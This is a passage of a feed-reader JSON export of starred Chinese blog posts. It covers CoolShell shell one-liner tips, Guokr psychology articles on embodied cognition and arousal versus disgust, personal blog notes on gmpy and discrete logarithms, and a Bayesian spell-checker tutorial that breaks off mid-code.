。<br>\n场景举例：比如Ubuntu里用<code>apt-get</code>安装软件包的时候是需要root身份的，我们经常会忘记在<code>apt-get</code>前加<code>sudo</code>。每次不得不加上<code>sudo</code>再重新键入这行命令，这时可以很方便的用<code>sudo !!</code>完事。<br>\n（陈皓注：在shell下，有时候你会输入很长的命令，你可以使用!xxx来重复最近的一次命令，比如，你以前输入过，vi /where/the/file/is, 下次你可以使用 !vi 重得上次最近一次的vi命令。）</li>\n</ul>\n<ul>\n<li><strong><code>cd –</code></strong><br>\n回到上一次的目录 。<br>\n场景举例：当前目录为<code>/home/a</code>，用<code>cd ../b</code>切换到<code>/home/b</code>。这时可以通过反复执行<code>cd –</code>命令在<code>/home/a</code>和<code>/home/b</code>之间来回方便的切换。<br>\n（陈皓注：cd ~ 是回到自己的Home目录，cd ~user，是进入某个用户的Home目录）</li>\n</ul>\n<ul>\n<li><strong>‘ALT+.’ or ‘&lt;ESC&gt; .’</strong><br>\n热建alt+. 或 esc+. 可以把上次命令行的参数给重复出来。</li>\n</ul>\n<ul>\n<li><strong><code>^old^new</code></strong><br>\n替换前一条命令里的部分字符串。<br>\n场景：<code>echo \"wanderful\"</code>，其实是想输出<code>echo \"wonderful\"</code>。只需要<code>^a^o</code>就行了，对很长的命令的错误拼写有很大的帮助。（陈皓注：也可以使用 <strong>!!:gs/old/new</strong>）</li>\n</ul>\n<ul>\n<li><strong>du -s * | sort -n | tail</strong><br>\n列出当前目录里最大的10个文件。</li>\n</ul>\n<ul>\n<li><strong>:w !sudo tee %</strong><br>\n在vi中保存一个只有root可以写的文件</li>\n</ul>\n<ul>\n<li><strong>date -d@1234567890</strong><br>\n时间截转时间</li>\n</ul>\n<ul>\n<li>\n<div title=\"Click to select this command\">\n<div><strong>&gt; file.txt</strong><br>\n创建一个空文件，比touch短。</div>\n</div>\n</li>\n</ul>\n<ul>\n<li><strong>mtr coolshell.cn</strong><br>\nmtr命令比traceroute要好。</li>\n</ul>\n<ul>\n<li>在命令行前加空格，该命令不会进入history里。</li>\n</ul>\n<ul>\n<li><strong>echo “ls -l” | at midnight</strong><br>\n在某个时间运行某个命令。</li>\n</ul>\n<ul>\n<li><strong>curl -u user:pass -d status=”Tweeting from the shell” http://twitter.com/statuses/update.xml</strong><br>\n命令行的方式更新twitter。</li>\n</ul>\n<ul>\n<li><strong>curl -u username –silent “https://mail.google.com/mail/feed/atom” | perl -ne ‘print “\\t” if /&lt;name&gt;/; print “$2\\n” if /&lt;(title|name)&gt;(.*)&lt;\\/\\1&gt;/;’</strong><br>\n检查你的gmail未读邮件</li>\n</ul>\n<ul>\n<li><strong>ps aux | sort -nk +4 | tail</strong><br>\n列出头十个最耗内存的进程</li>\n</ul>\n<ul>\n<li><strong><code>man ascii</code></strong><br>\n显示ascii码表。<br>\n场景：忘记ascii码表的时候还需要google么?尤其在天朝网络如此“顺畅”的情况下，就更麻烦在GWF多应用一次规则了，直接用本地的<code>man ascii</code>吧。</li>\n</ul>\n<ul>\n<li><strong><code>ctrl-x e</code></strong><br>\n快速启动你的默认编辑器（由变量$EDITOR设置）。</li>\n</ul>\n<ul>\n<li><strong><code>netstat –tlnp</code></strong><br>\n列出本机进程监听的端口号。（陈皓注：netstat -anop 可以显示侦听在这个端口号的进程）</li>\n</ul>\n<ul>\n<li><strong><code>tail -f /path/to/file.log | sed '/^Finished: SUCCESS$/ q'</code></strong><br>\n当file.log里出现Finished: SUCCESS时候就退出tail，这个命令用于实时监控并过滤log是否出现了某条记录。</li>\n</ul>\n<ul>\n<li><strong><code>ssh user@server bash &lt; /path/to/local/script.sh</code></strong><br>\n在远程机器上运行一段脚本。这条命令最大的好处就是不用把脚本拷到远程机器上。</li>\n</ul>\n<ul>\n<li><strong>ssh user@host cat /path/to/remotefile | diff /path/to/localfile -</strong><br>\n比较一个远程文件和一个本地文件</li>\n</ul>\n<ul>\n<li>\n<div title=\"Click to select this command\">\n<div><strong>net rpc shutdown -I ipAddressOfWindowsPC -U username%password</strong><br>\n远程关闭一台Windows的机器</div>\n</div>\n</li>\n</ul>\n<ul>\n<li><strong><code>screen -d -m -S some_name ping my_router</code></strong><br>\n后台运行一段不终止的程序，并可以随时查看它的状态。<code>-d -m</code>参数启动“分离”模式，<code>-S</code>指定了一个session的标识。可以通过<code>-R</code>命令来重新“挂载”一个标识的session。更多细节请参考screen用法 <code>man screen</code>。</li>\n</ul>\n<ul>\n<li><strong><code>wget --random-wait -r -p -e robots=off -U mozilla http://www.example.com</code></strong><br>\n下载整个www.example.com网站。（注：别太过分，大部分网站都有防爬功能了：））</li>\n</ul>\n<ul>\n<li><strong><code>curl ifconfig.me</code></strong><br>\n当你的机器在内网的时候，可以通过这个命令查看外网的IP。</li>\n</ul>\n<ul>\n<li><strong>convert input.png -gravity NorthWest -background transparent -extent 720×200  output.png</strong><br>\n改一下图片的大小尺寸</li>\n</ul>\n<ul>\n<li><strong><code>lsof –i</code></strong><br>\n实时查看本机网络服务的活动状态。</li>\n</ul>\n<ul>\n<li><strong>vim scp://username@host//path/to/somefile</strong><br>\nvim一个远程文件</li>\n</ul>\n<ul>\n<li><strong><code>python -m SimpleHTTPServer</code></strong><br>\n一句话实现一个HTTP服务，把当前目录设为HTTP服务目录，可以通过<code>http://localhost:8000</code>访问 这也许是这个星球上最简单的HTTP服务器的实现了。</li>\n</ul>\n<ul>\n<li><strong><code>history | awk '{CMD[$2]++;count++;} END { for (a in CMD )print CMD[a] \" \" CMD[a]/count*100 \"% \" a }' | grep -v \"./\" | column -c3 -s \" \" -t | sort -nr | nl | head -n10</code></strong><br>\n(陈皓注：有点复杂了，history|awk ‘{print $2}’|awk ‘BEGIN {FS=”|”} {print $1}’|sort|uniq -c|sort -rn|head -10)<br>\n这行脚本能输出你最常用的十条命令，由此甚至可以洞察你是一个什么类型的程序员。</li>\n</ul>\n<ul>\n<li>\n<div title=\"Click to select this command\">\n<div><strong>tr -c “[:digit:]” ” ” &lt; /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR=”1;32″ grep –color “[^ ]“</strong><br>\n想看看Marix的屏幕效果吗？（不是很像，但也很Cool!）</div>\n</div>\n</li>\n</ul>\n<p>看不懂行代码？没关系，系统的学习一下*nix shell脚本吧，力荐<a href=\"http://www.ituring.com.cn/book/980\">《Linux命令行与Shell脚本编程大全》</a>。</p>\n<p>最后还是那句Shell的至理名言：(陈皓注：下面的那个马克杯很不错啊，<a href=\"http://404null.com\">404null.com</a>挺有意思的)</p>\n<h2 style=\"text-align:center;font-size:24px\"><strong>“Where there is a shell，there is a way!”</strong></h2>\n<p style=\"text-align:left\"><img src=\"http://www.ituring.com.cn/download/01RTOxPgdeVs\" alt=\"Shell至理名言\"><br>\n<a href=\"http://404null.com/item/7/\"><img src=\"http://www.ituring.com.cn/download/01RTOxPvYWI0\" alt=\"Unix Shell变色马克杯\" width=\"420\" height=\"262\"></a></p>\n<p style=\"text-align:center\"><strong><a href=\"http://404null.com/item/7/\">Unix Shell变色马克杯</a></strong></p>\n<h4>参考文献：</h4>\n<ul>\n<li><a href=\"http://en.wikipedia.org/wiki/Unix_shell#Shell_categories\">Unix Shell Wiki</a></li>\n<li><a href=\"https://github.com\">Github language ranking</a></li>\n<li><a href=\"http://www.softpanorama.org/People/Shell_giants/introduction.shtml\">An introduction of Unix Shell history</a></li>\n<li><a href=\"http://www.tiobe.com/index.php/content/paperinfo/tpci/index.html\">Tiobe Software</a></li>\n<li><a href=\"http://www.commandlinefu.com/\">http://www.commandlinefu.com/</a></li>\n</ul>\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:14px;margin-bottom:50px\">——=== <b>访问 <a href=\"http://coolshell.cn/404/\">酷壳404页面</a> 以支持公益事业</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li>2013年01月09日 -- <a href=\"http://coolshell.cn/articles/8883.html\">应该知道的Linux技巧</a></li><li>2013年02月17日 -- <a href=\"http://coolshell.cn/articles/9070.html\">AWK 简明教程</a></li><li>2012年08月16日 -- <a href=\"http://coolshell.cn/articles/8088.html\">对技术的态度</a></li><li>2012年07月11日 -- <a href=\"http://coolshell.cn/articles/7829.html\">28个Unix/Linux的命令行神器</a></li><li>2013年02月20日 -- <a href=\"http://coolshell.cn/articles/9104.html\">sed 简明教程</a></li><li>2009年08月31日 -- <a href=\"http://coolshell.cn/articles/1379.html\">如何调试bash脚本</a></li><li>2012年08月01日 -- <a href=\"http://coolshell.cn/articles/7965.html\">一个fork的面试题</a></li><li>2012年05月03日 -- <a href=\"http://coolshell.cn/articles/7236.html\">用Unix的设计思想来应对多变的需求</a></li></ul><div><a rel=\"nofollow\" href=\"http://www.zemanta.com/?wp-related-posts\">Zemanta</a></div></div></div>"
    },
    "author" : "404null",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1353342865762",
    "timestampUsec" : "1353342865762274",
    "id" : "tag:google.com,2005:reader/item/7abd2636041673e7",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "先捂热，再调情",
    "published" : 1353342865,
    "updated" : 1353342865,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/386830/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p>具身认知（Embodied cognition），也称“具体化”（embodiment），是心理学中一个新兴的研究领域。具身认知理论主要指生理体验与心理状态之间有着强烈的联系[1][2]。生理体验“激活”心理感觉，反之亦然[3]。简言之，就是人在开心的时候会微笑，而如果微笑，人也会趋向于变得更开心。</p>\n<div>\n<h1>笑一笑，更积极</h1>\n<p>不信？试试下面这个：用牙齿咬住一支笔，并且不要让嘴唇碰到这支笔。有没有注意到，这个样子就是微笑（至少看起来像在微笑）。关键是，这时候使用的正是微笑时所调动的面部肌肉。然而，“迫使”自己微笑往往会让人处于更“积极”的心理状态，虽然有时候人们自己往往意识不到。在这种可能性之下，比起那些用嘴唇叼住钢笔（这阻碍“微笑肌”收缩）的被试相比，仅用牙齿咬住钢笔从而让“微笑肌”收缩的被试，对同一部动画片做出了更积极的评价[4][5]。</p>\n<p>顺着这样的思路不难想到，当同意某人时，人们往往倾向于点头，不同意时则摇头，虽然有时这种倾向不易察觉。有趣的是，在听到同一段话时（比如提高大学学费），较之被要求做出摇头动作的被试，点头的被试对这段话持有更为积极的态度。</p>\n</div>\n<div>\n<h1>想谈情，先捂热</h1>\n<p>这听着挺酷的，不过和性情有啥关系呢？一段关系的开始，需要两个人有某种程度的相互吸引。“吸引”的一个重要部分就是，是否觉得对方友好、善良、大方，以及总体上能给人一种“温暖”的感觉。由于人们通常倾向于给自己喜欢的人贴上“温暖”的标签，不喜欢的人则是“冰冷”的（外表性感的是“热辣”的），研究者们想知道，“温暖”或“冰冷”的生理感觉是否会影响人们对他人的看法。星巴克能帮忙回答这个问题。</p>\n<p>在最近的一项研究中，被试们分别被要求捧一下热咖啡（比如拿铁）或冷咖啡（比如星冰乐），然后对他人的整体印象进行打分。对于同一个人，捧过热咖啡的被试，比捧冷咖啡的被试更容易将其评价为在人际关系方面比较“温暖”的[6]。</p>\n<p>这一“冷热”效应也会影响一个人是愿意把一件礼品送给朋友还是自己留着。参与研究的被试有时会得到一些小礼品作为他们当“小白鼠”的报酬。在一项研究中，被试的小礼品是一瓶饮料或冰激凌店的1美元礼券。被试可以选择自己保留这些小礼品，或者将其转赠给朋友。手持暖的冰热垫的被试，比手持冷的冰热垫的被试更愿意将小礼品转赠给朋友。</p>\n<p>在另一项研究中，研究者让被试坐在晃动的椅子上（这样能给被试带来一种不稳定感）。当问及这些被试，希望伴侣有哪些品质时，他们比坐在固定椅子上的被试更希望拥有“稳定”（值得信赖、可靠等）的伴侣[7]。</p>\n<p>这种具身认知的效果实际上能影响人们对所处关系的满意度。当双方去往同一方向或经由相似的路线上班时（比如从家里出发后，都沿着同一条路驾车往西北方向走），他们会对婚姻更满意[8]。其实，还有实验证明，在走廊里，人们倾向于更喜欢和自己走同方向的人，而不是和自己反方向走的人。嗯，如果你和我走一条道儿，那咱显然心心相印。</p>\n<p>那这些都有什么实用价值呢？如果想和某人发展一下关系，那得想办法让Ta仅用牙齿咬住一支钢笔，或者手捧热咖啡，然后沿着一条松散的卵石路朝同一个方向走。这虽然不是常规方法，但，还是值得一试的！</p>\n<blockquote>\n<p>PS：知道优乐美为啥要被捧在手心了吧~~~</p>\n<p>PPS：“来，干了这碗热翔！”看了这篇文章，相信你会对这句话重新有个温暖的认识~~~</p>\n</blockquote>\n<p><strong>本文编译自：</strong></p>\n<p><a href=\"http://www.scienceofrelationships.com/home/2012/10/10/body-and-mind-how-seemingly-unrelated-physical-experiences-a.html\">Science of Relationships - | - Body and Mind: How Seemingly Unrelated Physical Experiences Affect Our Relationships</a></p>\n<p><strong>文中参考文献：</strong></p>\n<p>[1]Niedenthal, P. M., Barsalou, L. W., Winkielman, P., Krauth-Gruber, S., &amp; Ric, F. (2005). Embodiment in attitudes, social perception, and emotion. Personality and Social Psychology Review, 9, 184-211.</p>\n<p>[2]Landau, M. J., Meier, B. P., Keefer, L. A. (2010). A metaphor-enriched social cognition. Psychological Bulletin, 136,1045-1067.</p>\n<p>[3]Barsalou, L. W. (2008). Grounded cognition. Annual Review of Psychology, 59, 617-645.</p>\n<p>[4]Strack, F., Martin, L. L., &amp; Stepper, S. (1998). Inhibiting and facilitating conditions of the human smile: A nonobtrusive test of the facial feedback hypothesis. Journal of Personality and Social Psychology, 54, 768-777.</p>\n<p>[5]Wells, G. L., &amp; Petty, R. E. (1980). The effects of overt head movement on persuasion: Compatibility and incompatibility of responses. Basic and Applied Social Psychology, 1, 219-230.</p>\n<p>[6]Williams, L. E., &amp; Bargh, J. A. (2008). Experiencing physical warmth promotes interpersonal warmth. Science, 322, 606-607</p>\n<p>[7]Kille, D. R., Forest, A. L., &amp; Wood, J. V. (in press). Tall, dark, and stable: Embodiment motivates mate selection preferences. Psychological Science.</p>\n<p>[8]Huang, X., Dong, P., Dai, X., &amp; Wyer, R. S., Jr. (2012). Going my way? The benefits of travelling in the same direction. Journal of Experimental Social Psychology, 48, 978-981.</p>\n</div>\n</div>"
    },
    "author" : "Frances",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1352564474232",
    "timestampUsec" : "1352564474232007",
    "id" : "tag:google.com,2005:reader/item/37fc4346d55f95a6",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Diary Excerpt" ],
    "title" : "节省你的时间，对不起，我不感兴趣",
    "published" : 1351930150,
    "updated" : 1361105251,
    "alternate" : [ {
      "href" : "https://blog.delphij.net/2012/11/post-626.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>多年之前，老贾说过，对什么人都不能太好了，认识的，不认识的，都是这样。我觉得这方面我就是一直不觉悟。</p>\n\n<p>最近有个人没事就在MSN上问我一堆问题，而这些问题完全是文档写得清清楚楚，或者稍微试一下就能知道答案的。我觉得我之前纯粹就是犯贱，照说，对这种问题应该直接假装看不见，本来咱也不认识，何必呢？</p>\n\n<p>今天这哥们总算把我惹毛了，我这边改着patch，那边一条一条拼了命的发，当然，我的口气也不怎么客气，原文照登如下：</p>\n\n<p>我擦，你丫不能自己查下文档么？要不付我点咨询费？有问题发到论坛去，别没事老跟im上问，我没义务支持私人的请求</p>\n\n<p>嗯，是不太客气，于是，这哥们教训了我：</p>\n\n<p>厚道点儿，你没亏吃</p>\n\n<p>说到厚道嘛......只好先拉黑两天了，什么时候出来，看心情。另外：</p>\n\n<ol>\n\t<li>我只在工作时间支持本公司客户提出的技术问题；我的私人时间优先解决我自己遇到的问题，然后是给社区无偿地做些事情，包括写代码和去论坛回答问题；</li>\n\t<li>你提出问题的目的在于节省自己的时间，却在消耗我的时间；另一方面，你既然不愿意把问题发表在公开的论坛上，不愿意和公众分享这些知识，也就不会给社区带来什么贡献；</li>\n\t<li>我对那种能节省你的时间，却不能给我自己社区带来好处的事情，不感兴趣。多说一句，对不起，就算您想给钱，我也没兴趣。</li>\n</ol>"
    },
    "author" : "Xin LI",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/https://blog.delphij.net/atom.xml",
      "title" : "delphij&#39;s Chaos",
      "htmlUrl" : "https://blog.delphij.net/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1352092515642",
    "timestampUsec" : "1352092515642533",
    "id" : "tag:google.com,2005:reader/item/7e5f6230cd4d0864",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Security", "discretelogarithm" ],
    "title" : "gmpy/离散对数",
    "published" : 1350336263,
    "updated" : 1350337828,
    "alternate" : [ {
      "href" : "https://blog.delphij.net/2012/10/gmpy.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>前几天做一个解离散对数的题用到了 <a href=\"http://code.google.com/p/gmpy/\">gmpy</a>，它是 <a href=\"http://gmplib.org/\">GMP</a> 的 Python 封装，用来算大数。</p>\n\n<p>这里记两笔。首先是大整数需要用 mpz 对象，例如：</p>\n\n<p>p = mpz(13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903427690031858186486050853753882811946569946433649006084171)</p>\n\n<p>判断大数是否是质数：is_prime(p) （求离散对数其实用不着）</p>\n\n<p>求逆元 (x^-1)：invert(x, p)。例如， y = invert(x, p) 则 x*y % p = 1</p>\n\n<p>幂取模：pow(x, n, p)，即 (x ^ n) % p。结果仍为 mpz。</p>\n\n<p>mpz对象可以直接用在dict中做键值。</p>\n\n<p>题目中提供的方法是分治，将解 x 拆成两部分 x0*B+x1，其中B是2的整数次方幂（约为x上限的开方，例如如果x的范围是2^40，则B=2^20）。这样 x0, x1 分别小于 B，将方程整理成 x0, x1 分别在等式左右（其它部分都是常数了），然后穷举 x0 对应的值（计算2^20次，保存所有结果），然后穷举所有的 x1对应的值，如果发现之前保存的结果中有匹配，则输出对应的 x0, x1，从而算出x。由于将搜索范围变成了sqrt(N)，所需的时间也就大大减少了。</p>"
    },
    "author" : "Xin LI",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/https://blog.delphij.net/atom.xml",
      "title" : "delphij&#39;s Chaos",
      "htmlUrl" : "https://blog.delphij.net/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1351070478307",
    "timestampUsec" : "1351070478307773",
    "id" : "tag:google.com,2005:reader/item/0dedb8e74fae9da2",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "前戏做得好，随便重口味",
    "published" : 1351070478,
    "updated" : 1351070478,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/365194/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p>荷兰格罗宁根大学（University of Groningen）的科学家们最近研究发现，人——至少是女人——也许会因为被点燃欲火而克服与性有关的恶心因素。研究者发现，性的唤起压倒了自然的厌恶反应，使得女士们愿意从事那些她们在平时也许会觉得令人作呕的行为。</p>\n<p>在这项研究中，90 名女性被随机分配到 3 个组。一个组观看适合女性口味的色情录像；另一组观看令人血脉贲张的运动录像，诸如跳伞或者皮筏，这些录像意在使人产生无关风月的兴奋；第三组则要观看一段不痛不痒的火车视频（吐槽：谢耳朵肯定不这么认为）。</p>\n<p>之后，所有女性都被要求完成 16 项任务，大多都挺恶心，比如从里面有虫的杯子里喝水（虫是假的）、用被人用过的纸巾擦手、吃紧挨着一只活虫的饼干，或者把手指插进一盘用过的安全套里。</p>\n<p>研究者们发现，比起没有被性唤起的对照组来，观看过色情录像的女性对这些令人不悦任务的恶心程度，给出了更低的分数。她们完成的任务也更多一些，表明性唤起不仅抑制了厌恶反应，还影响到了女性做事的愿意程度。</p>\n<p>研究者们说，这有助于解释为什么很多人不顾性事固有的脏乱仍乐此不疲。“研究结果显示，性唤起程度的增强对主观上的反感情绪以及由反感导致的回避行为所产生的影响，能通过某种方式帮助人们进行愉悦的性爱。” 之前的研究表明，性唤起对男性也有同样的效果。</p>\n<p>性行为顾问、撰稿人伊安·科纳（Ian Kerner）博士在接受美国广播公司新闻频道（ABC News）的采访时说：“我想这项研究的有趣之处在于它支持了这样一种观点，即性唤起降低了心理抑制作用，常常会使人愿意做那些通常情况下他们觉得恶心或者反感的行为。”科纳也参与了这项研究。</p>\n<p>这项研究也给性功能障碍有关的疾病带来了希望。作者们说，性唤起不足也许会无法抑制反感因素，从而干扰健康的性生活。根本上来说，如果女性在性交前没有被充分唤起，她们可能会觉得性生活更让人讨厌，因此开始愈发抵制性交。不充分的唤起也会使女性无法享受性生活。</p>\n<p>作者们表示：这可能造成性接触方面的问题，还有阴道润滑不足，而这又会增加摩擦力，引起性交疼痛之类的问题；因此，在一些极端的情况下，女性会对性产生负面印象，并开始回避性交。</p>\n<p>作者们呼吁，在更大的人群中开展进一步的研究，包括患有性功能障碍的参与者。</p>\n<div>\n<div><br></div>\n</div>\n<div>\n<div><br></div>\n</div>\n<table>\n<col>\n<col>\n<tbody valign=\"top\">\n<tr><th>编译自:</th><td>ABC News， Why Sex Doesn’t Gross You Out When You’re Aroused</td>\n</tr>\n<tr><th>文章图片:</th><td>healthland.time.com</td>\n</tr>\n</tbody>\n</table>\n<p>本文编辑：熊出没</p>\n</div>"
    },
    "author" : "秦鹏",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1350888046475",
    "timestampUsec" : "1350888046475736",
    "id" : "tag:google.com,2005:reader/item/0534403a5c7039c6",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Shared Chaos" ],
    "title" : "央视公益广告：阿尔茲海默病",
    "published" : 1348466485,
    "updated" : 1348466761,
    "alternate" : [ {
      "href" : "https://blog.delphij.net/2012/09/post-624.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><a href=\"http://video.sina.com.cn/v/b/86240167-1870183597.html\">央视公益广告：阿尔茲海默病</a></p>\n\n<div></div>"
    },
    "author" : "Xin LI",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/https://blog.delphij.net/atom.xml",
      "title" : "delphij&#39;s Chaos",
      "htmlUrl" : "https://blog.delphij.net/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1350449693548",
    "timestampUsec" : "1350449693548889",
    "id" : "tag:google.com,2005:reader/item/316f550d4e8abac1",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "IT" ],
    "title" : "贝叶斯推断及其互联网应用（三）：拼写检查",
    "published" : 1350372744,
    "updated" : 1350372744,
    "alternate" : [ {
      "href" : "http://www.ruanyifeng.com/blog/2012/10/spelling_corrector.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<p>（这个系列的第一部分介绍了<a href=\"http://www.ruanyifeng.com/blog/2011/08/bayesian_inference_part_one.html\">贝叶斯定理</a>，第二部分介绍了如何<a href=\"http://www.ruanyifeng.com/blog/2011/08/bayesian_inference_part_two.html\">过滤垃圾邮件</a>，今天是第三部分。）</p><p>使用Google的时候，如果你拼错一个单词，它会提醒你正确的拼法。</p>\n\n<p>比如，你不小心输入了seperate。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201210/bg2012101601.png\"></p>\n\n<p>Google告诉你，<a href=\"http://www.ruanyifeng.com/blog/2004/06/seperate_separate.html\">这个词</a>是不存在的，正确的拼法是separate。</p>\n\n<p><img src=\"http://image.beekka.com/blog/201210/bg2012101602.png\"></p>\n\n<p>这就叫做\"拼写检查\"（spelling corrector）。有好几种方法可以实现这个功能，Google使用的是基于贝叶斯推断的统计学方法。这种方法的特点就是快，很短的时间内处理大量文本，并且有很高的精确度（90%以上）。Google的研发总监<a href=\"http://en.wikipedia.org/wiki/Peter_Norvig\">Peter Norvig</a>，写过一篇著名的<a href=\"http://norvig.com/spell-correct.html\">文章</a>，解释这种方法的原理。</p>\n\n<p>下面我们就来看看，怎么利用贝叶斯推断，实现\"拼写检查\"。其实很简单，一小段代码就够了。</p>\n\n<p><strong>一、原理</strong></p>\n\n<p>用户输入了一个单词。这时分成两种情况：拼写正确，或者拼写不正确。我们把拼写正确的情况记做c（代表correct），拼写错误的情况记做w（代表wrong）。</p>\n\n<p>所谓\"拼写检查\"，就是在发生w的情况下，试图推断出c。从概率论的角度看，就是已知w，然后在若干个备选方案中，找出可能性最大的那个c，也就是求下面这个式子的最大值。</p>\n\n<blockquote>\n\n<p>　　P(c|w)</p>\n\n</blockquote>\n\n<p>根据贝叶斯定理：</p>\n\n<blockquote>\n\n<p>　　P(c|w) =  P(w|c) * P(c)  / P(w)</p>\n\n</blockquote>\n\n<p>对于所有备选的c来说，对应的都是同一个w，所以它们的P(w)是相同的，因此我们求的其实是</p>\n\n<blockquote>\n\n<p>　　P(w|c) * P(c)</p>\n\n</blockquote>\n\n<p>的最大值。</p>\n\n<p>P(c)的含义是，某个正确的词的出现\"概率\"，它可以用\"频率\"代替。如果我们有一个足够大的文本库，那么这个文本库中每个单词的出现频率，就相当于它的发生概率。某个词的出现频率越高，P(c)就越大。</p>\n\n<p>P(w|c)的含义是，在试图拼写c的情况下，出现拼写错误w的概率。这需要统计数据的支持，但是为了简化问题，我们假设两个单词在字形上越接近，就有越可能拼错，P(w|C)就越大。举例来说，相差一个字母的拼法，就比相差两个字母的拼法，发生概率更高。你想拼写单词hello，那么错误拼成hallo（相差一个字母）的可能性，就比拼成haallo高（相差两个字母）。</p>\n\n<p>所以，我们只要找到与输入单词在字形上最相近的那些词，再在其中挑出出现频率最高的一个，就能实现 P(w|c) * P(c) 的最大值。</p>\n\n<p><strong>二、算法</strong></p>\n\n<p>最简单的算法，只需要四步就够了。</p>\n\n<p><strong>第一步，建立一个足够大的文本库。</strong></p>\n\n<p>网上有一些免费来源，比如<a href=\"http://www.gutenberg.org/wiki/Main_Page\">古登堡计划</a>、<a href=\"http://en.wiktionary.org/wiki/Wiktionary:Frequency_lists\">Wiktionary</a>、<a href=\"http://www.kilgarriff.co.uk/bnc-readme.html\">英国国家语料库</a>等等。</p>\n\n<p><strong>第二步，取出文本库的每一个单词，统计它们的出现频率。</strong></p>\n\n<p><strong>第三步，根据用户输入的单词，得到其所有可能的拼写相近的形式。</strong></p>\n\n<p>所谓\"拼写相近\"，指的是两个单词之间的\"编辑距离\"（edit distance）不超过2。也就是说，两个词只相差1到2个字母，只通过----删除、交换、更改和插入----这四种操作中的一种，就可以让一个词变成另一个词。</p>\n\n<p><strong>第四步，比较所有拼写相近的词在文本库的出现频率。频率最高的那个词，就是正确的拼法。</strong></p>\n\n<p>根据Peter Norvig的验证，这种算法的精确度大约为60%-70%（10个拼写错误能够检查出6个。）虽然不令人满意，但是能够接受。毕竟它足够简单，计算速度极快。（本文的最后部分，将详细讨论这种算法的缺陷在哪里。）</p>\n\n<p><strong>三、代码</strong></p>\n\n<p>我们使用Python语言，实现上一节的算法。</p>\n\n<p><strong>第一步，把网上下载的文本库保存为<a href=\"http://norvig.com/big.txt\">big.txt</a>文件。</strong>这步不需要编程。</p>\n\n<p><strong>第二步，加载Python的正则语言模块（re）和collections模块，后面要用到。</strong></p>\n\n<blockquote>\n\n<p>　　import re, collections</p>\n\n</blockquote>\n\n<p><strong>第三步，定义words()函数，用来取出文本库的每一个词。</strong></p>\n\n<blockquote>\n\n<p>　　def words(text): return re.findall('[a-z]+', text.lower())</p>\n\n</blockquote>\n\n<p>lower()将所有词都转成小写，避免因为大小写不同，而被算作两个词。</p>\n\n<p><strong>第四步，定义一个train()函数，用来建立一个\"字典\"结构。</strong>文本库的每一个词，都是这个\"字典\"的键；它们所对应的值，就是这个词在文本库的出现频率。</p>\n\n<blockquote>\n\n<p>　　def train(features):</p>\n\n<p>　　　　model = collections.defaultdict(lambda: 1)</p>\n\n<p>　　　　for f in features:</p>\n\n<p>　　　　　　model[f] += 1</p>\n\n<p>　　　　return model</p>\n\n</blockquote>\n\n<p>collections.defaultdict(lambda: 1)的意思是，每一个词的默认出现频率为1。这是针对那些没有出现在文本库的词。如果一个词没有在文本库出现，我们并不能认定它就是一个不存在的词，因此将每个词出现的默认频率设为1。以后每出现一次，频率就增加1。</p>\n\n<p><strong>第五步，使用words()和train()函数，生成上一步的\"词频字典\"，放入变量NWORDS。</strong></p>\n\n<blockquote>\n\n<p>　　NWORDS = train(words(file('big.txt').read()))</p>\n\n</blockquote>\n\n<p><strong>第六步，定义edits1()函数，用来生成所有与输入参数word的\"编辑距离\"为1的词。</strong></p>\n\n<blockquote>\n\n<p>　　alphabet = 'abcdefghijklmnopqrstuvwxyz'</p>\n\n<p>　　def edits1(word):</p>\n\n<p>　　　　splits     = [(word[:i], word[i:]) for i in 